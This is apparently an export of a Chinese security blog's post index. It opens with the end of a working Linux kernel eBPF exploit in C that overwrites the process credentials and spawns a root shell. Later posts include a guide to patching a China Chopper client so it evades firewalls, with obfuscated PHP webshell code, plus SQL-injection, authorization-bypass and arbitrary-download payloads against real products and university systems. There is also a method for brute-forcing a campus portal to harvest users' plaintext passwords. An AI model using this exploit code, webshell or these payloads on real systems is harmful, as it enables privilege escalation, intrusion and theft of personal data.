"\x95\x00\x00\x00\x00\x00\x00\x00" "\x55\x06\x02\x00\x01\x00\x00\x00" "\x7b\xa2\x00\x00\x00\x00\x00\x00" "\x95\x00\x00\x00\x00\x00\x00\x00" "\x7b\x87\x00\x00\x00\x00\x00\x00" "\x95\x00\x00\x00\x00\x00\x00\x00";char bpf_log_buf[LOG_BUF_SIZE];static int bpf_prog_load(enum bpf_prog_type prog_type, const struct bpf_insn *insns, int prog_len, const char *license, int kern_version) &#123; union bpf_attr attr = &#123; .prog_type = prog_type, .insns = (__u64)insns, .insn_cnt = prog_len / sizeof(struct bpf_insn), .license = (__u64)license, .log_buf = (__u64)bpf_log_buf, .log_size = LOG_BUF_SIZE, .log_level = 1, &#125;; attr.kern_version = kern_version; bpf_log_buf[0] = 0; return syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, sizeof(attr));&#125;static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size, int max_entries) &#123; union bpf_attr attr = &#123; .map_type = map_type, .key_size = key_size, .value_size = value_size, .max_entries = max_entries &#125;; return syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, sizeof(attr));&#125;static int bpf_update_elem(uint64_t key, uint64_t value) &#123; union bpf_attr attr = &#123; .map_fd = mapfd, .key = (__u64)&amp;key, .value = (__u64)&amp;value, .flags = 0, &#125;; return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, sizeof(attr));&#125;static int bpf_lookup_elem(void *key, void *value) &#123; union bpf_attr attr = &#123; .map_fd = mapfd, .key = (__u64)key, .value = (__u64)value, &#125;; return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, sizeof(attr));&#125;static void __exit(char *err) &#123; fprintf(stderr, "error: %s\n", err); exit(-1);&#125;static void prep(void) &#123; mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3); if (mapfd &lt; 0) __exit(strerror(errno)); progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, (struct bpf_insn *)__prog, PROGSIZE, "GPL", 0); if (progfd &lt; 0) __exit(strerror(errno)); if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets)) __exit(strerror(errno)); if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, sizeof(progfd)) &lt; 0) __exit(strerror(errno));&#125;static void writemsg(void) &#123; char buffer[64]; ssize_t n = write(sockets[0], buffer, sizeof(buffer)); if (n &lt; 0) &#123; perror("write"); return; &#125; if (n != sizeof(buffer)) fprintf(stderr, "short write: %lu\n", n);&#125;#define __update_elem(a, b, c) \ bpf_update_elem(0, (a)); \ bpf_update_elem(1, (b)); \ bpf_update_elem(2, (c)); \ writemsg();static uint64_t get_value(int key) &#123; uint64_t value; if (bpf_lookup_elem(&amp;key, &amp;value)) __exit(strerror(errno)); return value;&#125;static uint64_t __get_fp(void) &#123; __update_elem(1, 0, 0); return get_value(2);&#125;static uint64_t __read(uint64_t addr) &#123; __update_elem(0, addr, 0); return get_value(2);&#125;static void __write(uint64_t addr, uint64_t val) &#123; __update_elem(2, addr, val);&#125;static uint64_t get_sp(uint64_t addr) &#123; return addr &amp; ~(0x4000 - 1);&#125;static void pwn(void) &#123; uint64_t fp, sp, task_struct, credptr, uidptr; fp = __get_fp(); if (fp &lt; PHYS_OFFSET) __exit("bogus fp"); sp = get_sp(fp); if (sp &lt; PHYS_OFFSET) __exit("bogus sp"); task_struct = __read(sp); if (task_struct &lt; PHYS_OFFSET) __exit("bogus task ptr"); printf("task_struct = %lx\n", task_struct); credptr = __read(task_struct + CRED_OFFSET); // cred if (credptr &lt; PHYS_OFFSET) __exit("bogus cred ptr"); uidptr = credptr + UID_OFFSET; // uid if (uidptr &lt; PHYS_OFFSET) __exit("bogus uid ptr"); printf("uidptr = %lx\n", uidptr); __write(uidptr, 0); // set both uid and gid to 0 if (getuid() == 0) &#123; printf("spawning root shell\n"); system("/bin/bash"); exit(0); &#125; __exit("not vulnerable?");&#125;int main(int argc, char **argv) &#123; prep(); pwn(); return 0;&#125;]]></content>
      <categories>
        <category>渗透测试</category>
        <category>提权</category>
        <category>Linux内核提权</category>
      </categories>
      <tags>
        <tag>Linux内核提权</tag>
        <tag>Ubuntu4.4提权大杀器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[腾讯云COS图床智能上传工具编写]]></title>
    <url>%2F%E8%85%BE%E8%AE%AF%E4%BA%91COS%E5%9B%BE%E5%BA%8A%E6%99%BA%E8%83%BD%E4%B8%8A%E4%BC%A0%E5%B7%A5%E5%85%B7%E7%BC%96%E5%86%99.html</url>
    <content type="text"><![CDATA[编写意图在百度上能够找到的都是七牛云的图床上传工具，但是七牛云现在申请图床空间需要拿手持身份证照片来认证，所以果断放弃了七牛云，于是找到了腾讯云的COS，免费额度就够用了。但是，缺点在于，每一个图片都要自己手动上传，没有像七牛云那样的智能上传工具，所以自己用Python编写一款。 更新说明当前版本： V2.0 Beta 更新内容： 1. API接口信息从外部吸取(confing.conf) 2. 修复目录下无image目录报错 3. 生成EXE避免用户安装过多的第三方库 流程图主要流程： 上传函数流程： 相关功能实现将粘贴板的图片保存到本地使用win32clipboard 123win32clipboard.OpenClipboard()data = win32clipboard.GetClipboardData(win32clipboard.CF_DIB)win32clipboard.CloseClipboard() 但是直接将data写入bmp文件中，发现无法打开，百度以后找到解决办法(参考文章1)，代码量很长，这里不附上了，简单说下它的问题： 可以看到，一个全屏截图竟然达到了3.96M ，腾讯云免费空间才50G ， 要是上传这样的图片上去，我可吃不消啊。 使用PIL对图像处理 12345678from PIL import ImageGrabfrom PIL import Image# 从粘贴板获取内容im = ImageGrab.grabclipboard()# 判断内容是不是图片if isinstance(im,Image.Image): im.save("admintony.png") 上传到COS并获取地址腾讯COS SDK 腾讯对开发者提供了SDK，但是这个SDK只支持python2.6和python2.7，由于我的环境只有python3.6，所以没办法用了。腾讯云COS SDK 第三方支持python3的SDK库 本来想自己写，可是那个数字签名认证没写过，在网上找了找，还是看到了支持py3的第三方库了，直接用第三方库吧，方便。 第三方库地址： https://github.com/imu-hupeng/cos-python3-sdk/ 这个第三方库不是腾讯开发的，但是也是功能很齐全，例如上传文件实现： 12345cos = cos_lib3.Cos(app_id, secret_id, secket_key, region)bucket = cos.get_bucket("blog")json_data = bucket.upload_file(real_file_path=file_name, file_name=name, dir_name=folder)print(json_data) 输出结果是返回的json数组，里面包含了上传后的地址 将返回的图片地址复制到粘贴板实现剪切板的写入 还是用的pywin32中的win32clipboard库，代码如下： 12345def setText(aString): w.OpenClipboard() w.EmptyClipboard() w.SetClipboardData(win32con.CF_UNICODETEXT, aString) w.CloseClipboard() 这里有一个坑，百度上百度到的代码第三行使用的是win32con.CF_TEXT，但是测试发现CF_TEXT只能写入首字母，比如http://baidu.com 只能写入h。 查阅相关资料以后，发现有一个CF_UNICODETEXT，测试可以写入完整字符串。 对图片地址处理 在写入粘贴板之前，对图片地址做一个处理，处理成markdown格式的，![](PicUrl)然后放入剪切板。 代码实现： 123json_data = sub(bucket.upload_file(real_file_path=file_name, file_name=name, dir_name=folder))dict = json.loads(json_data)setText(r'![](&#123;&#125;)'.format(dict['source_url'])) 其中sub函数是将单引号替换成双引号的函数，因为该第三方库返回的json数组使用的是单引号，json.loads()不识别单引号。 sub函数代码： 12def sub(string): return re.sub('\'','\"',string) 腾讯云COS的一处忽略我发现复制到粘贴板的字符串都是http协议的，然而却防在markdown编辑器中却加载不到图片，看了下手动传的生成的地址，现在COS已经采用https协议了，所以还要对返回的地址做一个处理 12def sub_http(string): return re.sub('http:','https:',string) 成品展示使用展示 依赖的第三方库说明 win32con 和 win32clipboard ：安装了pywin32即可使用 PIL ：图像处理库 cos_lib3 : 腾讯云COS支持Python3的库，非官方库(github : https://github.com/imu-hupeng/cos-python3-sdk/) httplib2 : cos_lib3中使用了，因此安装 安装库： pip install pywin32 pip install PIL cos_lib3 : 已经放在了同目录下进行引用，无需安装 pip install httplib2 使用说明V1.0版本 在腾讯云的COS中申请API密钥，然后填写进去即可。 特别说明一下region： cos地址与对应园区的关系 tj -- 华北(天津园区) sh -- 华东(上海园区) gz -- 华南(广州园区) sgp -- 新加坡园区 bj -- 北京园区 官方只给出了前四个，可能现在更新出了北京园区，官方还没写上去吧。 V2.0 Beta版 监听界面： 上传图片： 配置文件： app_id = 125*******0 secret_id = AKIDa1G*******************fHeslSu secret_key = MSIs**********************dJYaR4U region = bj API信息获取请看V1.0版本的介绍。 项目地址https://github.com/admintony/COSIntelligentUpload 参考文章使用Python保存屏幕截图（不使用PIL） 腾讯云对象存储服务(COS) Python3 SDK 附录另外一种操作粘贴板的方法： 123456from Tkinter import Tkr = Tk()r.withdraw()r.clipboard_clear()r.clipboard_append('http://www.admintony.com')r.destroy()]]></content>
      <categories>
        <category>Python</category>
        <category>原创工具</category>
        <category>腾讯云COS图床智能上传工具</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>原创工具</tag>
        <tag>腾讯云COS</tag>
        <tag>图床智能上传工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[打造一款专属的Bypass菜刀]]></title>
    <url>%2F%E6%89%93%E9%80%A0%E4%B8%80%E6%AC%BE%E4%B8%93%E5%B1%9E%E7%9A%84Bypass%E8%8F%9C%E5%88%80.html</url>
    <content type="text"><![CDATA[这个方法曾在17年1月1日发表在T00LS(原帖地址：https://www.t00ls.net/thread-37535-1-1.html)，从未公开发表在博客，今天把方法发布出来，愿对各位道友有用，从而做出更好的Bypass菜刀 准备工作一把菜刀20100928发布的老版菜刀 查壳及脱壳查壳 可以看到，菜刀使用了UPX压缩壳. UPX壳主要是压缩作用，很容易脱壳. 脱壳 直接把软件拖进去即可脱壳。 免杀原理分析菜刀在连接webshell的时候发送的数据包情况，用WSExplorer或者Wireshark来抓包。 我们可以看出，菜刀连接webshell的时候发送的数据内容是： 1x=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7ZWNobyAkRC4iXHQiO2lmKHN1YnN0cigkRCwwLDEpIT0iLyIpe2ZvcmVhY2gocmFuZ2UoIkEiLCJaIikgYXMgJEwpaWYoaXNfZGlyKCRMLiI6IikpZWNobygkTC4iOiIpO307ZWNobygifDwtIik7ZGllKCk7 菜刀在连接Webshell的时候会发送两段数据,分别是x 和 z0 x 是shell的密码，其中的数据是让shell再接收一个z0 z0 中存放着执行命令，列目录，修改文件等操作的PHP代码,并试用base64加密数据. 经过测试发现，防火墙的拦截点有以下两点： 1.UA头，防火墙捕捉了一些恶意软件的UA头，一点发现UA头在列表中，则判断为恶意行为. 2.第一个参数x中的数据,赤裸裸的eval,哪个防火墙看见了也会拦截. 所以要做免杀就要做以下两点处理： 1.修改UA头，改成百度蜘蛛的UA 或者 正常浏览器的UA均可 2.将第一个参数中的数据也进行假面处理 实现免杀修改UA头由于改后的UA比原本的UA长，因此我们需要在程序领空的其他空白地方进行修改，免得覆盖程序代码. 正常的Chrome UA如下： Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 用C32asm修改后： OK，先记下这个地址000006E0 C32里面显示的是文件偏移地址，而OD显示的是内存偏移地址,那么需要在OD中找到文件偏移地址对应的内存偏移地址，然后将原来UA的地址换成新UA的地址 然后记录下这个内存偏移地址为：004006E0 找到将UA压栈的地方，修改地址为新的UA地址 然后右击 “复制到可执行文件” -&gt; 右击”保存文件” 再抓包测试： 看到UA已经修改了 修改第一个参数数据把@eval(base64_decode($_POST[z0])); 这段代码来进行自定义加密，然后再在shell中解密，这样也可以防止菜刀有后门。 我的自定义加密采用了凯撒密码：按照ascii表向后移动四位(尽量避开特殊字符，否则会失败),加密后的数据是 Dizep,fewi:8chigshi,(cTSWX_~4a–? 而杀软并不识别这段密文，因此达到免杀效果。 先在C32asm中搜索字符串 然后把里面的 @eval(base64_decode($POST[z0])); 用 Dizep,fewi:8chigshi,(cTSWX~4a–? 进行替换。 然后保存文件就大功告成了。 用法在已经做过免杀的shell中添加以下代码： 12345678function aaa($arr)&#123; $arr = stripcslashes($arr); for($i=0;$i&lt;strlen($arr);$i++)&#123; $arr[$i]=chr(ord($arr[$i])-4); &#125; return $arr;&#125;aaa($_POST['x']); // 解密传输数据 示例： 1234567891011121314151617181920&lt;?phpfunction aaa($arr)&#123; $arr = stripcslashes($arr); for($i=0;$i&lt;strlen($arr);$i++)&#123; $arr[$i]=chr(ord($arr[$i])-4); &#125; return $arr;&#125;$a=md5('ssss');echo $a.'';$b=substr($a,2,2)+37;$s=$b+18;$e=substr($a,-7,1);$r=$s-1;$t=$r+2;$z=chr($b).chr($s).chr($s).$e.chr($r).chr($t);$arr = aaa($_POST['x']);$z($arr);?&gt; 成品地址Bypass菜刀]]></content>
      <categories>
        <category>渗透测试</category>
        <category>Bypass系列</category>
        <category>Bypass菜刀</category>
      </categories>
      <tags>
        <tag>Bypass菜刀</tag>
        <tag>修改菜刀</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[校园网认证系统(RG-SAM+ Portal组件)用户信息泄露漏洞]]></title>
    <url>%2F%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%AE%A4%E8%AF%81%E7%B3%BB%E7%BB%9F-RG-SAM-Portal%E7%BB%84%E4%BB%B6-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.html</url>
    <content type="text"><![CDATA[漏洞发现的开始在寒假前，想着到家以后可能还要用到实验室的电脑，然后在实验室电脑上安装了Teramviewer 作为控制端，但是如果电脑重启时间过长，会导致开机以后需要重新在校园网认证系统中登陆才能连接互联网，因此写了一个登陆校园网认证系统的脚本，在这个过程中发现了这个漏洞 简单介绍一下校园网认证系统在以下界面登陆： 登陆成功后返回的界面： 认证系统的原理图： 初现端倪–UserIndex看到这个UserIndex，我想到，如果我访问别人的这个界面是不是可以看到别人的信息呢？ 于是在实验室的电脑上登陆了一个朋友的账号，然后访问朋友账号登陆成功的UserIndex，如下： 和我登陆了似的，然后我测试了一下几项内容： 如果我访问别人的界面点击下线按钮，他还可以上网吗？ 答案： 不能 。 左上角有个自助服务，点击进去可以修改密码但是要原密码 综上 挖掘到的这个漏洞只能给别人断网吗？那可没达到我要的效果。 再看端倪–UserIndex的规律无论进一步深入还是就停留在搞恶作剧，都需要对UserIndex进行爆破，那么就必须掌握它的规律。 我收集了一些UserIndex 其中包括(PC网线直连的,PC WIFI接入的,安卓手机登入的,苹果手机登入的)，规律如下： 根据测试发现，userIndex基本上由3段组成： 固定前缀 30613532373163316135396430313232616631323931386332323865396334315f31302e313 接入方式标识符 PC网线接入：02e342e31365f PC WIFI接入：62e3230302e3138335f 安卓 WIFI接入：62e35322e3233355f 苹果 WIFI接入：62e3133362e385f 用户标识符 我把用户标识符分成了3段，第一段是51 学号开始前缀，第二段是入学年份，第三段是学号。 比如：5120158888则会变成35313230313538383838 规律是：从第一位开始(把第一位前也添加一个3)，每隔一位添加一个3 COOKIES中隐藏的秘密访问自己登陆成功的界面的时候，随手按下了F12看了一下数据包中，COOKIES里面记录自己的学号、明文密码等一系列的内容 那么我如果访问别人的登陆成功界面呢？ COOKIE里面的明文账号密码仍然是我当前登陆用户的，而非目标的。因此无法利用。 柳暗花明看到上面那个图，你发现没有？ 以userIndex作为POST值，来getOnlineUserInfo 。 OK ，我们看下返回值是什么 这里显示乱码的原因是：目标页面没有设置header头，而其返回的是utf-8编码的，浏览器没看到header头里面定义，就按照系统默认编码(GBK)解析了。 回归正题，到这里，你会发现，如果向/eportal/InterFace.do?method=getOnlineUserInfo界面POST 目标UserIndex就可以拿到其姓名、学号、明文密码等信息。 漏洞的利用讲了这么多，大家最关心的还是这个漏洞怎么利用。 编写脚本，生成userIndex ， 然后在同学们用网比较多的时段来进行爆破，成功率很高，脚本地址： ePortalGetPass 漏洞修复方式： 用更高强度的无规律的userIndex替换这个有规律的userIndex，可以将无序userIndex写入数据库 我测试直接GET请求/eportal/InterFace.do?method=getOnlineUserInfo返回的是当前登陆用户的信息，那么可以删除POST方式，或者在查询之前先对比该UserIndex是否和当前登陆用户的UserIndex一致 附录这个漏洞比较鸡肋，只能爆破出和你在同一路由器下面的用户信息，不在同一路由器下的无法查询信息。]]></content>
      <categories>
        <category>渗透测试</category>
        <category>逻辑漏洞</category>
        <category>越权</category>
      </categories>
      <tags>
        <tag>信息泄露</tag>
        <tag>越权查询</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ZZCMS v8.2 重装GETSHELL工具]]></title>
    <url>%2FZZCMS-v8-2-%E9%87%8D%E8%A3%85GETSHELL%E5%B7%A5%E5%85%B7.html</url>
    <content type="text"><![CDATA[漏洞来源[代码审计]ZZCMS v8.2 前台注入，任意文件删除至getshell 作者是水泡泡，我只是写了一个利用工具，并且发现了两处彩蛋 工具编写思路要考虑的难点 (1) 由于是通过重装cms导致的GETSHELL，最重要的是：怎么才能尽可能小的缩小动静 解决方法： 不重写MYSQL的库，在安装的时候选择其他的库名，防止网站原来的内容丢失。 这里不要填写的和网站原来的数据库名相同，防止文件覆盖，导致网站无法运行(MYSQL 的数据以文件形式存放，一会儿还可以用来还原网站) (2) 水泡泡师傅提供了一个SQL注入点，可以用来注入出MYSQL用户的密码，但是密码无法解密怎么办？ 解决方法：提供远程接口，可以在使用远程数据库来进行安装 工具流程图 成品展示 参数说明： python3 main.py -u URL # 检测漏洞 python3 main.py -u URL --info # 注入数据 python3 main.py -u URL -H host -U MySQL_user -P MySQL_pass 网站还原 将这些信息按照注入出的还原回去即可。 代码下载：ZZCMS_V8.2_GETSHELL 在编写程序的时候发现的越权越过/install/intall.lock重装：在代码中只有setp_1检测了/install/install.lock是否存在，而其他的地方没有检测 重装CMS 需要用到第三步，拿到一个token ， 然后第五步包括token和数据库信息进行安装。 第三步如下： 第五步如下： 然后第六步是生成/install/install.lock 如果没删就可以跳过，删了的话补充上这一步即可 第二处越权，无需token直接安装，看代码： 这是set_5.php中的，看到这里做了个验证，如果token不正确，那就退出 但是回到index.php中看： 包含set_5.php在对文件操作之后，所以说，无论set_5.php中的内容是怎样的，在执行其中代码之前就已经把恶意代码写入到inc/config.php中了]]></content>
      <categories>
        <category>Python</category>
        <category>原创工具</category>
        <category>ZZCMS_GETSHELL</category>
      </categories>
      <tags>
        <tag>GETSHELL工具</tag>
        <tag>ZZCMS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SVN源代码泄露利用工具]]></title>
    <url>%2FSVN%E6%BA%90%E4%BB%A3%E7%A0%81%E6%B3%84%E9%9C%B2%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7.html</url>
    <content type="text"><![CDATA[SVN 版本 &gt;1.7 时，Seay的工具不能dump源码了，故写了一个脚本来dump源码 用法及展示列文件python3 svnExploit.py -u &quot;http://127.0.0.1/message/.svn/&quot; 只查看文件名以及类型 和 checksum，如果没有需要dump的文件，比如只有写JS、CSS 就没必要dump下来分析了。 下载文件如果需要dump，则 加上–dump指令 python3 svnExploit.py -u &quot;http://127.0.0.1/message/.svn/&quot; --dump 线程说明：默认是5个线程，如果觉得太慢，可以–thread 20来设置线程数。 代码下载svnExploit]]></content>
      <categories>
        <category>Python</category>
        <category>原创工具</category>
        <category>svnExploit</category>
      </categories>
      <tags>
        <tag>svnExploit</tag>
        <tag>svn源代码泄露</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF-练习平台WEB部分writeup]]></title>
    <url>%2FCTF-%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0WEB%E9%83%A8%E5%88%86writeup.html</url>
    <content type="text"><![CDATA[web2 http://120.24.86.145:8002/web2/F12查看源代码就可以找到了。 文件上传测试 http://103.238.227.13:10085/打开以后，看到要求有两点，如下： 有两点要求： 1.要求是PHP文件 2.文件大小不超过1M 猜测，是检测图片头的，从png里面把最前面的内容粘贴到PHP文件中，后面附上php的代码。 文件大小两个k ， 两个要求都满足了，上传。 失败，抓包测试。 修改Content-Type: 为：image/png提交 计算题 http://120.24.86.145:8002/yanzhengma/ 打开界面看到这个，计算出结果以后，发现，输入框只让填写一个数字，心想是js前端验证，burp抓包修改数值就行了吧。 发现根本没有发送数据包，那flag肯定在js里面 Web基础$_GET http://120.24.86.145:8002/get/ 看到关键代码，直接get提交一个’flag’即可 web基础$_POST http://120.24.86.145:8002/post/ 跟上面那个GET的一样，很基础 矛盾 http://120.24.86.145:8002/get/index1.php 这个题两个要求： 1.$num 不是integer类型的数据 2.$num 要等于1 考到的点是PHP的弱数据类型，payload : 1e0 PHP在做数据转换的时候会自动向高精度转化，然后就变成了1e0 这个是科学计数法，其值刚好等于1.(但是：1e0是integer类型的) Web3 http://120.24.86.145:8002/web3/web3的提示： 估计是flag 放在了html里面，然后打开： 弹了好多框，弹框貌似点不完，直接在URL前面加上view-source:即可，当然禁用JS之后查看源代码也行 html实体编码，直接创建一个html文件，把这段字符放进去用浏览器打开就行了。 sql注入 http://103.238.227.13:10083/提示注入，但是打开页面以后，在id后面添加任何东西都没有反应，之前见过id=100之前的页面都错误，id=101时给出其他提示的题目，测试后也没发现有其他提示，但是发现了： id = 0 或者 1 的时候页面显示正常，id是其他值的时候，页面均是错误的。 后来百度了一下，是宽字节注入，可能自己对宽字节注入知识掌握的不够。 宽字节注入产生的原理：在开启转义时，单引号会被转义成\’ ，当数据库字符集是gbk的时候，可以用%df等宽字节来将单引号前的\来抹去，从而闭合单引号。 构造正确页面： http://103.238.227.13:10083/index.php?id=1%df&apos;--+ 这里要注意，在注入的时候，sql的注释符 尽量用–+ 或者 %23 ，因为有时候–会被数据库认为是减号。–后加任意一个非空格字符则表示为注释符号。 然后直接扔到sqlmap即可。 http://103.238.227.13:10083/index.php?id=1%df&apos;*--+ 注入语句加在*位置 SQL注入1 http://103.238.227.13:10087/页面中附上了一段代码 1234567891011121314//过滤sql$array = array('table','union','and','or','load_file','create','delete','select','update','sleep','alter','drop','truncate','from','max','min','order','limit');foreach ($array as $value)&#123; if (substr_count($id, $value) &gt; 0) &#123; exit('包含敏感关键字！'.$value); &#125;&#125;//xss过滤$id = strip_tags($id);$query = "SELECT * FROM temp WHERE id=&#123;$id&#125; LIMIT 1"; 其中过滤了很多sql注入的关键词，但是在xss过滤时候使用了strip_tags函数，这个函数的作用是把&lt;&gt;替换为空，那么sele&lt;&gt;ct就可以绕过关键字过滤。 payload： http://103.238.227.13:10087/?id=1 uni&lt;&gt;on sel&lt;&gt;ect 1,hash fr&lt;&gt;om sql3.key %23 其中 key 要改成 数据库名.key 否则返回错误，可能当前页面和key不在同一数据库吧。]]></content>
      <categories>
        <category>比赛</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>宽字节注入实例</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[某站从任意文件上传到system权限一气呵成]]></title>
    <url>%2F%E6%9F%90%E7%AB%99%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B0system%E6%9D%83%E9%99%90%E4%B8%80%E6%B0%94%E5%91%B5%E6%88%90.html</url>
    <content type="text"><![CDATA[某高校任意文件上传漏洞，可拿system权限，文章发布时，该高校已经修复了该漏洞，并测试无法从该文章中的其他细节部分进行二次入侵 注册点 看到如上功能，所想到的三点： (1) sql注入 (2) 密码重置漏洞 (3) 注册用户后产生的一系列漏洞 经测试，排除(1) (2) 只能进行(3) 普通用户的任意文件上传 上传以后插入文件中，但是没任何显示。 右击查看源代码，找到shell地址： 提权 基础信息收集 win2008 x64 ，可执行cmd 用户是iis内置用户 公网ip 远程端口3389开启 开有mssql服务，未发现杀软 提权思路 1.EXP提权 2.mssql服务找到sa账号密码之后提权 尝试1：尝试了MS15051、ms16014、ms16-016、ms16-032 均无果，应该是服务器开启了自动更新，补丁都打了。 尝试2：寻找sa的密码，在web.config中找到 使用大马的mssql数据库管理功能执行命令，查看权限： 然后mstsc链接即可，但是发现有未知防护拦截了外部链接3389，于是转发3389端口，然后连接 总结web.config中的数据库用户及密码都进行了编码，明文的密码是错误的，我找到密码的方式是看备份文件，备份文件中密码是以明文存放的，且密码未修改过。因此，在此后的渗透过程中，要多注意这一点。(ps:这篇文章没什么有价值的地方，好久没写过渗透记录了，别人还以为我只会sql注入呢。)]]></content>
      <categories>
        <category>渗透测试</category>
        <category>提权</category>
        <category>MSSQL提权</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>MSSQL提权</tag>
        <tag>GETSHELL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ACCESS注入之逐字猜解法-Python工具]]></title>
    <url>%2FACCESS%E6%B3%A8%E5%85%A5%E4%B9%8B%E9%80%90%E5%AD%97%E7%8C%9C%E8%A7%A3%E6%B3%95-Python%E5%B7%A5%E5%85%B7.html</url>
    <content type="text"><![CDATA[今天遇到一个站点，明显有sql注入，但是sqlmap就是跑不出来，测试可以用逐字猜解法法来进行注入，因此写这个工具，节约手工时间。 前置知识12345678910获取表名：and exists (select * from 表名)获取列名：and exists (select 列名 from 表名)获取列名的长度：and (select top 1 len(列名) from 表名)&gt;=5获取 第一位编码：and (select top 1 asc(mid(列名,位数,1)) from 表)&gt;=97获取 第二位编码：and (select top 1 asc(mid(列名,位数,1)) from 表)&gt;=100 工具实现用法及效果展示注入表名：sql-injection.py -u url --tables --keyword=true_keywoed 注入列名：sql-injection.py -u url -T table_name --columns --keyword=true_keywoed 注入数据：sql-injection.py -u url -T table_name -C col1,col2 --dump --keyword=true_keywoed 代码地址ACCESS-Injection]]></content>
      <categories>
        <category>Python</category>
        <category>原创工具</category>
        <category>ACCESS自动注入工具</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>access注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[某建站系统版本漏洞，影响四川多高校，泄露几万学生数据]]></title>
    <url>%2F%E6%9F%90%E5%BB%BA%E7%AB%99%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%EF%BC%8C%E5%BD%B1%E5%93%8D%E5%9B%9B%E5%B7%9D%E5%A4%9A%E9%AB%98%E6%A0%A1%EF%BC%8C%E6%B3%84%E9%9C%B2%E5%87%A0%E4%B8%87%E5%AD%A6%E7%94%9F%E6%95%B0%E6%8D%AE.html</url>
    <content type="text"><![CDATA[这也是对自己学校校园网测试的时候发现的，后来测试一下发现是通杀。 越权http://xxx/Sys/OneLogin.aspx?Id=admin Id参数可控，导致越权，可以直接输入admin登陆管理后台。 后台功能很多，包括但不仅限于 删除违纪数据，查看学生信息(精确到床位)，学生调班等。 点击学号还可以查看更详细的数据 并且支持导出 注入越权点也是个注入点 http://xxx/Sys/OneLogin.aspx?Id=admin &apos; and 1=convert(int,(user)) and &apos;a&apos;=&apos;a 任意文件下载http://ip/Sys/SystemForm/DownloadFile.aspx?DownUrl=../Sys/SystemForm/DownloadFile.aspx DownUrl指定的目录是/WebDown/…. /WebDown/ 和 /Sys 是同级目录，构造payload即可下载任意文件，没检验后缀，也没检验文件类型 影响高校 这些高校漏洞在文章发布前已全部修复。]]></content>
      <categories>
        <category>渗透测试</category>
        <category>越权</category>
      </categories>
      <tags>
        <tag>越权</tag>
        <tag>西华升腾</tag>
        <tag>数据泄露</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[子域名发现工具]]></title>
    <url>%2F%E5%AD%90%E5%9F%9F%E5%90%8D%E5%8F%91%E7%8E%B0%E5%B7%A5%E5%85%B7.html</url>
    <content type="text"><![CDATA[子域名在渗透中起着很重要的作用，子域名挖掘工具很多，比如Seay法师写的那款暴力枚举的子域名挖掘工具。但是在挖掘过程中，我发现Seay写的那款，对于那些收录较高的站点，挖掘效率很低，甚至还会卡死。因此自己写了一款基于百度搜索语法的子域名挖掘工具，适用于收录高的站点。 V1.0版本用法e.g.main.py --domain=ParentDomain -p PageNum [--thread=5] # --domain 填写父域名如：admintony.top # -p 填写要爬行的页数，页数过大会重新重新爬第一页，所以建议百度搜索inurl:domain后再填写页数 # --thread 参数可选，默认为5 展示 代码地址：Digger V2.0版本更新说明在这段时间的使用过程中，发现了V1.0版本一些设计不够友好，还需要一些人力来辅助，所以进行了算法优化更新，这次都更新了什么： 1.优化算法，不再需要用户输入page_num，而是对页面中“下一页”识别判断是否为最后一页。 2.支持存活检测，–status 选项，支持用户自定义存活状态码，默认为all即不进行存活检测 新的用法介绍新版本的用法也有些不同了，下面是新版本的用法介绍： python diiger2.0.py --domain=swust.edu.cn [--status=200,404,403,401] [--thread=10] 12345Options: -h, --help show this help message and exit --domain=DOMAIN 父域名！[必须参数] --thread=THREAD_NUM 线程数！[可选，默认为5] --status=STATUS 存活检测状态码，默认不进行存活检测！输入状态码以&quot;,&quot;隔开[可选，默认不进行存活检测] 展示 代码地址Digger]]></content>
      <tags>
        <tag>digger-子域名发现工具</tag>
        <tag>原创工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一枚有意思的mysql注入]]></title>
    <url>%2F%E4%B8%80%E6%9E%9A%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84mysql%E6%B3%A8%E5%85%A5.html</url>
